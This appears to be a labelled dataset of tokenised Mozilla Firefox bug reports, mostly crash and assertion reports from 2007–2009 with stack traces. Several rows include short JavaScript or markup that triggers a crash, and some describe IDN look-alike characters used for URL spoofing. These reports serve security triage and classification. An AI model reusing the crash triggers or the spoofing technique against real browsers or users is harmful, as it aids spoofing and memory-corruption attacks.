crash nsattributetextnode nsattributetextnode with text and stroke-dasharray and stroke-dashoffset see testcase which crashes in current trunk build 0 nsattributetextnode nsattributetextnode mozilla/content/base/src/nstextnode.cpp:103 1 xul.dll 2 nssvglength maybegetctxrect mozilla/content/svg/content/src/nssvglength.cpp:597 3 nssvglength maybeaddasobserver mozilla/content/svg/content/src/nssvglength.cpp:608 4 nssvglength setcontext nsiweakreference unsigned char mozilla/content/svg/content/src/nssvglength.cpp:515 5 nssvgutils coordtofloat nsprescontext nssvgelement nsstylecoord const mozilla/layout/svg/base/src/nssvgutils.cpp:668 6 nssvggeometryframe getstrokedashoffset mozilla/layout/svg/base/src/nssvggeometryframe.cpp:238 7 nssvggeometryframe setupcairostroke gfxcontext mozilla/layout/svg/base/src/nssvggeometryframe.cpp:421	11
crash nstypedselection scrollpointintoclipview with toggling iframe mousedown and mousemove see testcase to get the crash download the testcase to your computer because it makes use of enhanced privileges then quickly move your mouse back and fort across the iframe i have n't been able to find a regression range it seems like the latest builds are easier to crash but i have been able to crash a 2008-01-02 build at least maybe this will be fixed by the patch for bug 421083 0 1 nstypedselection scrollpointintoclipview nsprescontext nsiview nspoint int mozilla/layout/generic/nsselection.cpp:5544 2 nstypedselection scrollpointintoview nsprescontext nsiview nspoint int int mozilla/layout/generic/nsselection.cpp:5594 3 nstypedselection doautoscrollview nsprescontext nsiview nspoint int mozilla/layout/generic/nsselection.cpp:5716 4 nstypedselection startautoscrolltimer nsprescontext nsiview nspoint unsigned int mozilla/layout/generic/nsselection.cpp:5416 5 nsframe handledrag nsprescontext nsguievent nseventstatus mozilla/layout/generic/nsframe.cpp:2144 6 nsframe handleevent nsprescontext nsguievent nseventstatus mozilla/layout/generic/nsframe.cpp:1510 7 nspresshelleventcb handleevent nseventchainpostvisitor mozilla/layout/base/nspresshell.cpp:1224 8 xul.dll	11
crash nscontainerframe reflowoverflowcontainerchildren with moz-column loading the testcase in a mac trunk debug build triggers assertion frame not in line line contains adeletedframe file users/jruderman/trunk/mozilla/layout/generic/nsblockframe.cpp line 5366 assertion ca n't find deleted frame in lines error file users/jruderman/trunk/mozilla/layout/generic/nsblockframe.cpp line 5346 crash nscontainerframe reflowoverflowcontainerchildren calling nsoverflowcontinuationtracker stepforward dereferencing	11
crash nsoverflowcontinuationtracker insert with moz-column padding margin loading the testcase makes firefox crash with nsoverflowcontinuationtracker insert calling	11
crash nsstylecontext destroy on reload with mtext and moz-box-ordinal-group see testcase which crashes in current trunk build on reload it does n't crash in a 2008-01-09 build but does crash in a 2008-01-10 build 0 stack from debug build dddddddd gklayout.dll nscomptr nsprescontext nscomptr nsprescontext nsprescontext arawptr line 628 c gklayout.dll nsstylecontext destroy line 926 c gklayout.dll nsstylecontext release line 93 c gklayout.dll nsstylecontext nsstylecontext line 108 c gklayout.dll nsstylecontext scalar deleting destructor bytes c gklayout.dll nsstylecontext destroy line 930 c gklayout.dll nsstylecontext release line 93 c gklayout.dll nsframe nsframe line 351 c gklayout.dll nssplittableframe nssplittableframe bytes c gklayout.dll nscontainerframe nscontainerframe line 82 bytes c gklayout.dll nshtmlcontainerframe nshtmlcontainerframe bytes c gklayout.dll nsblockframe nsblockframe line 282 bytes c gklayout.dll nsblockframe scalar deleting destructor bytes c gklayout.dll nsframe destroy line 510 bytes c gklayout.dll nssplittableframe destroy line 74 c gklayout.dll nscontainerframe destroy line 300 c gklayout.dll nsblockframe destroy line 314 c gklayout.dll nsframelist destroyframes line 68 c gklayout.dll nscontainerframe destroy line 260 c gklayout.dll nsboxframe destroy line 963 c gklayout.dll nsdocelementboxframe destroy line 110 c gklayout.dll nsframelist destroyframes line 68 c gklayout.dll nscontainerframe destroy line 260 c gklayout.dll nsboxframe destroy line 963 c gklayout.dll nsframelist destroyframes line 68 c gklayout.dll nscontainerframe destroy line 260 c gklayout.dll viewportframe destroy line 69 c gklayout.dll nsframemanager destroy line 284 c gklayout.dll presshell destroy line 1708 c gklayout.dll documentviewerimpl destroy line 1526 c gklayout.dll documentviewerimpl show line 1848 c gklayout.dll nsprescontext ensurevisible int aunsuppressfocus=0 line 1461 c gklayout.dll presshell unsuppressandinvalidate line 4316 bytes c gklayout.dll presshell unsuppresspainting line 4365 c gklayout.dll documentviewerimpl loadcomplete unsigned int astatus=0 line 1015 c docshell.dll nsdocshell endpageload nsiwebprogress aprogress nsichannel achannel unsigned int astatus=0 line 5069 c docshell.dll nswebshell endpageload nsiwebprogress aprogress nsichannel channel unsigned int astatus=0 line 1016 c docshell.dll nsdocshell onstatechange nsiwebprogress aprogress nsirequest arequest unsigned int astateflags=131088 unsigned int astatus=0 line 4974 c docshell.dll nsdocloader fireonstatechange nsiwebprogress aprogress nsirequest arequest int astateflags=131088 unsigned int astatus=0 line 1236 c docshell.dll nsdocloader dostopdocumentload nsirequest request unsigned int astatus=0 line 869 c docshell.dll nsdocloader docloaderisempty line 765 c docshell.dll nsdocloader onstoprequest nsirequest arequest nsisupports actxt unsigned int astatus=0 line 682 c necko.dll nsloadgroup removerequest nsirequest request nsisupports ctxt unsigned int astatus=0 line 688 bytes c gklayout.dll nsdocument dounblockonload line 5731 c gklayout.dll nsdocument unblockonload int afiresync=1 line 5679 c gklayout.dll nsbindingmanager doprocessattachedqueue line 963 c gklayout.dll nsrunnablemethod nsbindingmanager run line 262 c xpcom_core.dll nsthread processnextevent int maywait=1 int result line 511 c xpcom_core.dll ns_processnextevent_p nsithread thread int maywait=1 line 227 bytes c gkwidget.dll nsbaseappshell run line 170 bytes c tkitcmps.dll nsappstartup run line 181 bytes c xul.dll xre_main int argc=1 char argv const nsxreappdata aappdata line 3170 bytes c firefox.exe ns_internal_main int argc=1 char argv line 158 bytes c firefox.exe wmain int argc=1 unsigned short argv line 87 bytes c firefox.exe tmaincrtstartup line 583 bytes c firefox.exe wmaincrtstartup line 403 c kernel32.dll baseprocessstart 4 bytes	11
fix crash nsstylecontext destroy with image map mathml mozilla/5.0 macintosh u intel mac os x 10.5 en-us rv:1.9.1a1pre gecko/2008053113 minefield/3.1a1pre steps to reproduce 1 load the testcase 2 reload or close the window but do n't navigate to another page first result crash nsstylecontext destroy calling	11
fix crash placeholdertxn redotransaction with redo formatblock domcharacterdatamodified mutation listener loading the testcase makes placeholdertxn redotransaction dereference a random address with mallocscribble and mallocprescribble enabled i ve seen it dereference and	11
crash nscontentutils compareposition with binding see testcase which crashes in current trunk build this regressed between 2008-06-22 and 2008-06-23 i think a regression from bug 344258 stacktrace from debug build gklayout.dll nscontentutils getcontextforeventhandlers nsinode anode nsiscriptcontext acontext line 4354 bytes c gklayout.dll nsgenericelement getcontextforeventhandlers nsiscriptcontext acontext line 346 bytes c gklayout.dll nscontentutils compareposition nsinode anode1 nsinode anode2 line 1533 bytes c gklayout.dll nscontentutils positionisbefore nsinode anode1 nsinode anode2 line 280 bytes c gklayout.dll nsidentifiermapentry addidcontent nsicontent acontent line 459 bytes c gklayout.dll nsdocument updateidtableentry nsicontent acontent line 2272 c gklayout.dll nsxuldocument addelementtodocumentpre nsicontent aelement line 1625 c gklayout.dll nsxuldocument addsubtreetodocument nsicontent aelement line 1705 bytes c gklayout.dll nsxblbinding installanonymouscontent nsicontent aanonparent nsicontent aelement line 371 c gklayout.dll nsxblbinding generateanonymouscontent line 663 c gklayout.dll nsxblservice loadbindings nsicontent acontent nsiuri aurl nsiprincipal aoriginprincipal int aaugmentflag=0 nsxblbinding abinding int aresolvestyle line 631 c gklayout.dll nscssframeconstructor constructframeinternal nsframeconstructorstate astate nsicontent acontent nsiframe aparentframe nsiatom atag int anamespaceid=6 nsstylecontext astylecontext nsframeitems aframeitems int axblbasetag=0 line 7424 bytes c gklayout.dll nscssframeconstructor constructframe nsframeconstructorstate astate nsicontent acontent nsiframe aparentframe nsframeitems aframeitems line 7379 bytes c gklayout.dll nscssframeconstructor processinlinechildren nsframeconstructorstate astate nsicontent acontent nsiframe aframe int acanhavegeneratedcontent=1 nsframeitems aframeitems int akidsallinline line 12618 bytes c gklayout.dll nscssframeconstructor constructinline nsframeconstructorstate astate const nsstyledisplay adisplay nsicontent acontent nsiframe aparentframe nsstylecontext astylecontext int aispositioned=0 nsiframe anewframe line 12390 bytes c gklayout.dll nscssframeconstructor constructframebydisplaytype nsframeconstructorstate astate const nsstyledisplay adisplay nsicontent acontent int anamespaceid=6 nsiatom atag nsiframe aparentframe nsstylecontext astylecontext nsframeitems aframeitems int ahaspseudoparent=0 line 6591 bytes c gklayout.dll nscssframeconstructor constructframeinternal nsframeconstructorstate astate nsicontent acontent nsiframe aparentframe nsiatom atag int anamespaceid=6 nsstylecontext astylecontext nsframeitems aframeitems int axblbasetag=0 line 7558 bytes c gklayout.dll nscssframeconstructor constructframe nsframeconstructorstate astate nsicontent acontent nsiframe aparentframe nsframeitems aframeitems line 7379 bytes c gklayout.dll nscssframeconstructor contentinserted nsicontent acontainer nsicontent achild int aindexincontainer=0 nsilayouthistorystate aframestate line 8966 c gklayout.dll nscssframeconstructor recreateframesforcontent nsicontent acontent line 11087 bytes c gklayout.dll nscssframeconstructor processrestyledframes nsstylechangelist achangelist line 9825 c gklayout.dll presshell recreateframesfor nsicontent acontent line 3374 bytes c gklayout.dll nsxblbindingrequest documentloaded nsidocument abindingdoc line 263 c gklayout.dll nsxblstreamlistener load nsidomevent aevent line 478 c gklayout.dll dispatchtointerface nsidomevent aevent nsidomeventlistener alistener unsigned int nsidomevent amethod const nsid aiid line 184 bytes c gklayout.dll nseventlistenermanager handleevent nsprescontext aprescontext nsevent aevent nsidomevent adomevent nsisupports acurrenttarget unsigned int aflags=6 nseventstatus aeventstatus line 1182 bytes c gklayout.dll nseventtargetchainitem handleevent nseventchainpostvisitor avisitor unsigned int aflags=6 line 212 c gklayout.dll nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor avisitor unsigned int aflags=6 nsdispatchingcallback acallback line 271 c gklayout.dll nseventdispatcher dispatch nsisupports atarget nsprescontext aprescontext nsevent aevent nsidomevent adomevent nseventstatus aeventstatus nsdispatchingcallback acallback line 479 bytes c gklayout.dll nsxmldocument endload line 580 bytes c gklayout.dll nsxmlcontentsink didbuildmodel line 381 c gkparser.dll nsexpatdriver didbuildmodel unsigned int anerrorcode=0 int anotifysink=1 nsiparser aparser nsicontentsink asink line 1311 bytes c gkparser.dll nsparser didbuildmodel unsigned int anerrorcode=0 line 1527 bytes c gkparser.dll nsparser resumeparse int allowiteration=1 int aisfinalchunk=1 int acaninterrupt=1 line 2283 c gkparser.dll nsparser onstoprequest nsirequest request nsisupports acontext unsigned int status=0 line 2916 bytes c gklayout.dll nsxblstreamlistener onstoprequest nsirequest request nsisupports actxt unsigned int astatus=0 line 380 bytes c necko.dll nsbasechannel onstoprequest nsirequest request nsisupports ctxt unsigned int status=0 line 623 c necko.dll nsinputstreampump onstatestop line 577 c necko.dll nsinputstreampump oninputstreamready nsiasyncinputstream stream line 401 bytes c xpcom_core.dll nsinputstreamreadyevent run line 112 c xpcom_core.dll nsthread processnextevent int maywait=1 int result line 511 c xpcom_core.dll ns_processnextevent_p nsithread thread int maywait=1 line 227 bytes c gkwidget.dll nsbaseappshell run line 170 bytes c tkitcmps.dll nsappstartup run line 182 bytes c xul.dll xre_main int argc=1 char argv const nsxreappdata aappdata line 3265 bytes c firefox.exe ns_internal_main int argc=1 char argv line 156 bytes c firefox.exe wmain int argc=1 unsigned short argv line 87 bytes c firefox.exe tmaincrtstartup line 583 bytes c firefox.exe wmaincrtstartup line 403 c kernel32.dll baseprocessstart 4 bytes	11
crash nsgenerichtmlformelement unbindfromtree with domattrmodified removing file input in form see testcase which crashes current trunk build within 100ms it also crashes firefox 3 so marking security sensitive for now 0 xul.dll xul.dll 1 xul.dll nsgenerichtmlformelement unbindfromtree content/html/content/src/nsgenerichtmlelement.cpp:2513 2 xul.dll nshtmlinputelement unbindfromtree content/html/content/src/nshtmlinputelement.cpp:1917 3 xul.dll nsgenericelement doremovechildat content/base/src/nsgenericelement.cpp:3366 4 xul.dll nsgenericelement removechildat content/base/src/nsgenericelement.cpp:3293 5 xul.dll nsgenericelement doremovechild content/base/src/nsgenericelement.cpp:3955 6 xul.dll nsgenericelement removechild content/base/src/nsgenericelement.cpp:3521 7 xul.dll nsidomnode_removechild obj-firefox/js/src/xpconnect/src/dom_quickstubs.cpp:2757 8 js3250.dll js_interpret js/src/jsinterp.cpp:4998	11
handling of u+2571 and u+ff1a in idns allows url spoofing user-agent mozilla/4.0 compatible msie 6.0 windows nt 5.2 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.0.7 gecko/20060909 firefox/1.5.0.7 in case of a href x2571 example.com a a href xff1a 8888 x2571 example.com a firefox allows users to click the link and displays essentially the following strings in the status and address bar if it was able to make the request on windows and macosx the requests both go to example.com and in case of the latter the request will be malformed as it includes host www.bank.xn com:8888-br3e.example.com while apache rejects such a request it s not difficult to work around that i was unable to reproduce the problem on linux there are other characters that look like and though only some of them are displayed literally opera9 and ie7 consider both resource identifiers malformed and do not attempt to traverse them reproducible always	9
idn blacklist needs to include box-drawing characters the idn code contains a blacklist of characters that are confusingly similar to others that automatically kick us into the punycode display this is stored as the pref network.idn.blacklist_chars apparently we re missing the box-drawing characters and a recent talk at blackhat dc appears to have taken advantage of that to spoof an ssl connection to a bank since it s just a screen shot i ca n't be sure but i can reproduce the results with those characters	9
assertion disconnected nodes and assertion invalid array index with selection/range loading the testcase triggers assertion disconnected nodes parents1.elementat pos1 parents2.elementat pos2 adisconnected file users/jruderman/trunk/mozilla/content/base/src/nscontentutils.cpp line 1570 assertion invalid array index i length file dist/include/xpcom/nstarray.h line 317 filing as security-sensitive because the invalid array index assertion is happening in nstarray elementat which is not bounds-checked at runtime	11
crash nssvgpathseg setcurrentlist with pathseglist appenditem and replaceitem see testcase which crashes current trunk build this regressed between 2007-01-17 and 2007-01-18 before that date i get not implemented errors so i think this is a regression from bug 363839 somehow 0 xul.dll nscomptr nsiscriptcontext operator nscomptr.h:713 1 xul.dll nssvgpathseg setcurrentlist mozilla/content/svg/content/src/nssvgpathseg.cpp:151 2 xul.dll nssvgpathseglist removeelementat mozilla/content/svg/content/src/nssvgpathseglist.cpp:344 3 xul.dll nssvgpathseglist replaceitem mozilla/content/svg/content/src/nssvgpathseglist.cpp:251 4 xul.dll ns_invokebyindex_p mozilla/xpcom/reflect/xptcall/src/md/win32/xptcinvoke.cpp:101 5 xul.dll xpcwrappednative callmethod mozilla/js/src/xpconnect/src/xpcwrappednative.cpp:2388	11
iframe src c iframe triggers assertion this is unsafe loading the testcase on one of my 10.5 machines triggers assertion this is unsafe nscontentutils issafetorunscript file users/jruderman/central/layout/base/nsdocumentviewer.cpp line 1054 assertion someone forgot to block scripts aissafetoflush nscontentutils issafetorunscript file users/jruderman/central/layout/base/nspresshell.cpp line 4505 assertion how did we get here if it s not safe to run scripts nscontentutils issafetorunscript file users/jruderman/central/layout/base/nspresshell.cpp line 5556	11
crash little2_updateposition with xmlhttprequest and large xml file see testcase which crashes current trunk build and firefox 3 on load for me this might be related to bug 314660 although the testcase does n't crash in firefox 2 0 xul.dll little2_updateposition parser/expat/lib/xmltok_impl.c:1745 1 xul.dll moz_xml_resumeparser parser/expat/lib/xmlparse.c:1787 2 xul.dll xul.dll	11
assertion someone forgot to block scripts aissafetoflush nscontentutils issafetorunscript i know there are other bugs about this assertion but i m not using domi and i have n't been using venkman 00 ntdll dbgbreakpoint 01 xpcom_core break char amsg assertion someone forgot to block scripts aissafetoflush nscontentutils issafetorunscript file c home/mozilla.org/mozilla-central/layout/base/nspresshell.cpp line 4496 c home\mozilla.org\mozilla-central\xpcom\base\nsdebugimpl.cpp 481 02 xpcom_core ns_debugbreak_p unsigned int aseverity 1 char astr someone forgot to block scripts char aexpr aissafetoflush nscontentutils issafetorunscript char afile c home/mozilla.org/mozilla-central/layout/base/nspresshell.cpp int aline 4496 c home\mozilla.org\mozilla-central\xpcom\base\nsdebugimpl.cpp 359 03 gklayout presshell issafetoflush int aissafetoflush c home\mozilla.org\mozilla-central\layout\base\nspresshell.cpp 4496 04 gklayout presshell doflushpendingnotifications mozflushtype atype flush_layout 4 int ainterruptiblereflow 1 c home\mozilla.org\mozilla-central\layout\base\nspresshell.cpp 4517 05 gklayout presshell willpaint void c home\mozilla.org\mozilla-central\layout\base\nspresshell.cpp 6021 06 gklayout nsviewmanager flushpendinginvalidates void c home\mozilla.org\mozilla-central\view\src\nsviewmanager.cpp 2239 07 gklayout nsviewmanager enablerefresh unsigned int aupdateflags 2 c home\mozilla.org\mozilla-central\view\src\nsviewmanager.cpp 1944 08 gklayout nsviewmanager enablerefresh unsigned int aupdateflags 2 c home\mozilla.org\mozilla-central\view\src\nsviewmanager.cpp 1929 09 gklayout documentviewerimpl initpresentationstuff int adoinitialreflow 1 int areenablerefresh 1 c home\mozilla.org\mozilla-central\layout\base\nsdocumentviewer.cpp 752 0a gklayout documentviewerimpl show void c home\mozilla.org\mozilla-central\layout\base\nsdocumentviewer.cpp 1915 0b docshell nsdocshell setvisibility int avisibility 1 c home\mozilla.org\mozilla-central\docshell\base\nsdocshell.cpp 4015 0c gklayout nssubdocumentframe showdocshell void c home\mozilla.org\mozilla-central\layout\generic\nsframeframe.cpp 979 0d gklayout nssubdocumentframe showviewer void c home\mozilla.org\mozilla-central\layout\generic\nsframeframe.cpp 327 0e gklayout nssubdocumentframe init class nsicontent acontent class nsiframe aparent class nsiframe aprevinflow c home\mozilla.org\mozilla-central\layout\generic\nsframeframe.cpp 313 0f gklayout nscssframeconstructor initandrestoreframe class nsframeconstructorstate astate class nsicontent acontent class nsiframe aparentframe class nsiframe aprevinflow class nsiframe anewframe int aallowcounters 1 c home\mozilla.org\mozilla-central\layout\base\nscssframeconstructor.cpp 6764 10 gklayout nscssframeconstructor constructhtmlframe class nsframeconstructorstate astate class nsicontent acontent class nsiframe aparentframe class nsiatom atag int anamespaceid 0 class nsstylecontext astylecontext struct nsframeitems aframeitems int ahaspseudoparent 0 c home\mozilla.org\mozilla-central\layout\base\nscssframeconstructor.cpp 5567 11 gklayout nscssframeconstructor constructframeinternal class nsframeconstructorstate astate class nsicontent acontent class nsiframe aparentframe class nsiatom atag int anamespaceid 0 class nsstylecontext astylecontext struct nsframeitems aframeitems int axblbasetag 0 c home\mozilla.org\mozilla-central\layout\base\nscssframeconstructor.cpp 7530 12 gklayout nscssframeconstructor constructframe class nsframeconstructorstate astate class nsicontent acontent class nsiframe aparentframe struct nsframeitems aframeitems c home\mozilla.org\mozilla-central\layout\base\nscssframeconstructor.cpp 7402 13 gklayout nscssframeconstructor contentappended class nsicontent acontainer int anewindexincontainer 10 c home\mozilla.org\mozilla-central\layout\base\nscssframeconstructor.cpp 8580 14 gklayout presshell contentappended class nsidocument adocument class nsicontent acontainer int anewindexincontainer 10 c home\mozilla.org\mozilla-central\layout\base\nspresshell.cpp 4698 15 gklayout nsnodeutils contentappended class nsicontent acontainer int anewindexincontainer 10 c home\mozilla.org\mozilla-central\content\base\src\nsnodeutils.cpp 120 16 gklayout nscontentsink notifyappend class nsicontent acontainer unsigned int astartindex c home\mozilla.org\mozilla-central\content\base\src\nscontentsink.cpp 1332 17 gklayout sinkcontext flushtags void c home\mozilla.org\mozilla-central\content\html\document\src\nshtmlcontentsink.cpp 1383 18 gklayout sinkcontext didaddcontent class nsicontent acontent c home\mozilla.org\mozilla-central\content\html\document\src\nshtmlcontentsink.cpp 743 19 gklayout sinkcontext closecontainer nshtmltag atag ehtmltag_iframe 50 int amalformed 0 c home\mozilla.org\mozilla-central\content\html\document\src\nshtmlcontentsink.cpp 977 1a gklayout htmlcontentsink closecontainer nshtmltag atag ehtmltag_iframe 50 c home\mozilla.org\mozilla-central\content\html\document\src\nshtmlcontentsink.cpp 2385 1b gkparser cnavdtd closecontainer nshtmltag atag ehtmltag_iframe 50 int amalformed 0 c home\mozilla.org\mozilla-central\parser\htmlparser\src\cnavdtd.cpp 2800 1c gkparser cnavdtd closecontainersto int anindex 2 nshtmltag atarget ehtmltag_iframe 50 int aclosedbystarttag 0 c home\mozilla.org\mozilla-central\parser\htmlparser\src\cnavdtd.cpp 2848 1d gkparser cnavdtd closecontainersto nshtmltag atag ehtmltag_iframe 50 int aclosedbystarttag 0 c home\mozilla.org\mozilla-central\parser\htmlparser\src\cnavdtd.cpp 2992 1e gkparser cnavdtd handleendtoken class ctoken atoken c home\mozilla.org\mozilla-central\parser\htmlparser\src\cnavdtd.cpp 1764 1f gkparser cnavdtd handletoken class ctoken atoken class nsiparser aparser c home\mozilla.org\mozilla-central\parser\htmlparser\src\cnavdtd.cpp 760 20 gkparser cnavdtd buildmodel class nsiparser aparser class nsitokenizer atokenizer class nsitokenobserver anobserver class nsicontentsink asink c home\mozilla.org\mozilla-central\parser\htmlparser\src\cnavdtd.cpp 332 21 gkparser nsparser buildmodel void c home\mozilla.org\mozilla-central\parser\htmlparser\src\nsparser.cpp 2352 22 gkparser nsparser resumeparse int allowiteration 1 int aisfinalchunk 1 int acaninterrupt 1 c home\mozilla.org\mozilla-central\parser\htmlparser\src\nsparser.cpp 2221 23 gkparser nsparser continueinterruptedparsing void c home\mozilla.org\mozilla-central\parser\htmlparser\src\nsparser.cpp 1728 24 gkparser nsparser handleparsercontinueevent class nsparsercontinueevent ev c home\mozilla.org\mozilla-central\parser\htmlparser\src\nsparser.cpp 1795 25 gkparser nsparsercontinueevent run void c home\mozilla.org\mozilla-central\parser\htmlparser\src\nsparser.cpp 162 26 xpcom_core nsthread processnextevent int maywait 1 int result c home\mozilla.org\mozilla-central\xpcom\threads\nsthread.cpp 511 27 xpcom_core ns_processnextevent_p class nsithread thread int maywait 1 c home\mozilla.org\mozilla-central\dbg-firefox-i686-pc-mingw32\xpcom\build\nsthreadutils.cpp 227 28 gkwidget nsbaseappshell run void c home\mozilla.org\mozilla-central\widget\src\xpwidgets\nsbaseappshell.cpp 170	11
crash deletingframesubtree with moz-column pre-line legend assertion unexpected frame type not reached file layout/base/nscssframeconstructor.cpp line 10583 assertion reflow dirty lines failed ns_succeeded rv file layout/generic/nsblockframe.cpp line 955 assertion out-of-flow on wrong child list childframe getstatebits ns_frame_out_of_flow file layout/base/nscssframeconstructor.cpp line 9221 crash deletingframesubtree calling or calling dodeletingframesubtree which then dereferences null	11
assertion negative length crash with xbl rtl assertion negative length getcontentend mcontentoffset 0 file layout/generic/nstextframe.h line 307 assertion bad index pruint32 aindex mstate.mlength file nstextfragment.h line 184 assertion integer overflow mmaxtextlength mmaxtextlength aframe getcontentlength file layout/generic/nstextframethebes.cpp line 1187 assertion invalid offset aoffset mskipchars mcharcount file gfx/thebes/src/gfxskipchars.cpp line 92 security-sensitive because these assertions scare me related to bug 429458	11
assertion missing a script blocker loading 400790-1.xul layout/xul/base/src/grid/crashtests/400790-1.xul triggers assertion missing a script blocker nscontentutils issafetorunscript file users/jruderman/central/content/xul/content/src/nsxulelement.cpp line 853 looks like this assertion was added in bug 436965	11
crash js_decompilevaluegenerator this.__definesetter x map this.watch x new function var y eval x true crashes at for opt and asserts debug shell on mac 10.5.5 this occurs for both trunk and tracemonkey shells console output for tracemonkey shell js-dbg-tm-intelmac js this.__definesetter x map js this.watch x new function var y eval js x true assertion failure size_t regs sp stackbase stackdepth script at jsopcode.cpp:4988 trace/bpt trap js-opt-tm-intelmac js this.__definesetter x map js this.watch x new function var y eval js x true segmentation fault exception type exc_bad_access sigsegv exception codes kern_invalid_address at crashed thread 0 thread 0 crashed 0 js-opt-tm-intelmac js_decompilevaluegenerator 229 1 js-opt-tm-intelmac js_reportvalueerrorflags 55 2 js-opt-tm-intelmac js_reportisnotfunction 350 3 js-opt-tm-intelmac js_valuetofunction 143 4 js-opt-tm-intelmac js_valuetofunctionobject 84 nominating security sensitive due to scary address of	11
crash using array.splice on an array with some non-set elements js_getgcthingtracekind user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.9.0.4 gecko/2008111419 gentoo firefox/3.0.4 build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.9.0.4 gecko/2008111419 gentoo firefox/3.0.4 using this simple javascript lines crash ff3.0.4 var a new array 999 a 6 toto a.splice 6 1 reproducible always steps to reproduce 1 set a simple html document with the following code intentionally left bare for brevity bug occurs with proper doctype set etc html body script var a new array 999 a 6 toto a.splice 6 1 script body html 2 open the page in ff and wait 3 browser will crash within a few seconds actual results crash sometimes with some delay of 5-10 seconds or more expected results no crash array should contain no element but have length 998 it seems the script does work before the crash so i m not sure what is going wrong adding an alert shows that the length has been updated as expected var a new array 999 a 6 toto a.splice 6 1 alert a.length shows 998 as expected crash happens on ff windows as well	11
hang involving gczeal this.__definesetter x math.sin this.watch x concat gczeal 2 x 1 this hangs 1.9.0.x debug and trunk debug with and without j does n't seem to affect opt because opt by default does n't compile with the gczeal function security-sensitive because of the gczeal function thanks jesse for helping with the process of reduction	11
win mac only crash nshtmlreflowstate getnearestcontainingblock with xul listbox position absolute the following testcase crashes firefox with a null dereference nshtmlreflowstate getnearestcontainingblock asserts first at assertion placeholder relationship should have been torn down see comments in nsplaceholderframe.h shell framemanager getplaceholderframefor moutofflowframe file users/skywalker/desktop/mozilla/cvs/mozilla/layout/generic/nsplaceholderframe.cpp line 132 then at assertion dead placeholder in placeholder map entry placeholderframe getoutofflowframe void file users/skywalker/desktop/mozilla/cvs/mozilla/layout/base/nsframemanager.cpp line 136 and finally at assertion no placeholder frame nsnull placeholderframe file users/skywalker/desktop/mozilla/cvs/mozilla/layout/generic/nshtmlreflowstate.cpp line 1082 testcase is derived from crashtest in bug 354771 related to bug 398332	11
crash gfxskipcharsiterator setoffsets with first-letter position absolute and setting innerhtml on root marking security sensitive just in case see testcase which crashes current trunk build within 100ms or a little later this seems to have regressed between 2007-09-16 and 2007-09-18 regression from bug 385607 or from bug 393796 0 xul.dll gfxskipcharsiterator setoffsets mozilla/gfx/thebes/src/gfxskipchars.cpp:129 1 xul.dll gfxskipcharsiterator setoriginaloffset gfxskipchars.h:265 2 xul.dll xul.dll 3 xul.dll nslinelayout reflowframe mozilla/layout/generic/nslinelayout.cpp:859 4 xul.dll nsfirstletterframe reflow mozilla/layout/generic/nsfirstletterframe.cpp:240	11
crash pl_dhashtableoperate nseditor endupdateviewbatch with domnodeinserted event listener removing window and frameset contenteditable see testcase which crashes current trunk build this regressed between 2008-04-23 and 2008-04-24 i think a regression of bug 386782 the data url of the iframe consists of this script window.addeventlistener domnodeinserted function window.frameelement.parentnode.removechild window.frameelement true script frameset contenteditable true useful stack of breakpad i also get a lot of useless stacks 0 xul.dll pl_dhashtableoperate pldhash.c:588 1 xul.dll nsthashtable nsbasehashtableet nsstringhashkey nscomptr nsidomstorage getentry nsthashtable.h:164 2 xul.dll nsclasshashtable nsuint32hashkey nscomarray nsxultemplateresultrdf get nsclasshashtable.h:101 3 xul.dll nscommandmanager commandstatuschanged mozilla/embedding/components/commandhandler/src/nscommandmanager.cpp:127 4 xul.dll nscomposercommandsupdater updatecommandgroup mozilla/editor/composer/src/nscomposercommandsupdater.cpp:347 5 xul.dll nscomposercommandsupdater updatedirtystate mozilla/editor/composer/src/nscomposercommandsupdater.cpp:291 6 xul.dll nscomposercommandsupdater notifydocumentstatechanged mozilla/editor/composer/src/nscomposercommandsupdater.cpp:107 7 xul.dll xul.dll 8 xul.dll nseditor incrementmodificationcount mozilla/editor/libeditor/base/nseditor.cpp:3877 9 xul.dll nseditor doafterdotransaction mozilla/editor/libeditor/base/nseditor.cpp:4638 10 xul.dll nseditor dotransaction mozilla/editor/libeditor/base/nseditor.cpp:690 11 xul.dll nseditor insertnode mozilla/editor/libeditor/base/nseditor.cpp:1393 12 xul.dll nstexteditrules createbogusnodeifneeded mozilla/editor/libeditor/text/nstexteditrules.cpp:1332 13 xul.dll nstexteditrules init mozilla/editor/libeditor/text/nstexteditrules.cpp:141 14 xul.dll nshtmleditrules init mozilla/editor/libeditor/html/nshtmleditrules.cpp:252 15 xul.dll nshtmleditor initrules mozilla/editor/libeditor/html/nshtmleditor.cpp:437 16 xul.dll nsplaintexteditor endeditorinit mozilla/editor/libeditor/text/nsplaintexteditor.cpp:180 17 xul.dll nsautoeditinitrulestrigger nsautoeditinitrulestrigger mozilla/editor/libeditor/text/nstexteditutils.cpp:134 18 xul.dll nshtmleditor init mozilla/editor/libeditor/html/nshtmleditor.cpp:344 19 xul.dll nseditingsession setupeditoronwindow mozilla/editor/composer/src/nseditingsession.cpp:492 20 xul.dll nseditingsession makewindoweditable mozilla/editor/composer/src/nseditingsession.cpp:208	11
crash nsstylecontext destroy with domattrmodified removing window mathml apply iframe and window display none style see testcase which normally crashes current trunk build very quickly after loading it also crashes firefox 3 but not firefox 2 it seems if wanted i could look for the regression range the iframe source consists of this xml-stylesheet href chrome browser/skin type text/css window xmlns xmlns html xmlns mathml mathml apply html iframe mathml apply html style window display none html style html marquee wizardpage script xmlns document.documentelement.removeattributenode document.documentelement.attributes 0 window.addeventlistener domattrmodified function e window.frameelement.parentnode.removechild window.frameelement true script window	11
fix crash nsxuldocument synchronizebroadcastlistener with command see testcase which crashes current trunk build and firefox 3 within 100ms 0 xul.dll nsxuldocument synchronizebroadcastlistener content/xul/document/src/nsxuldocument.cpp:703 1 xul.dll nstarray_base swaparrayelements obj-firefox/xpcom/build/nstarray.cpp:205 2 xul.dll nsxuldocument endupdate content/xul/document/src/nsxuldocument.cpp:3271	11
nsasyncinstantiateevent run uses pointer comparison to check if old frame new frame the new frame may be located exactly in the same place in the memory especially because of frame arena and that is why frame mframe looks pretty scary there is a flush just before the check and that could run scripts or do whatever 124 timeless has a stack trace which might be related to this problem	11
